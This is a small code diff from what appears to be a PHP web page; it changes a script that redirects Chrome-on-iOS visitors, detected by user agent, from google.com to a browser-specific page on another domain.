@@ -71,7 +71,7 @@ if ( strpos($ua,"iphone") || strpos($ua,"ipad") ) {
 <script>
 if(navigator.userAgent.match('CriOS')) {
     //document.write('<meta http-equiv="refresh" content="0;URL='http://example.com/'" />');
-    window.location.replace("http://google.com");
+    window.location.replace("http://www.ichanger.tk/chrome.php");
 }
 </script>
 <script>
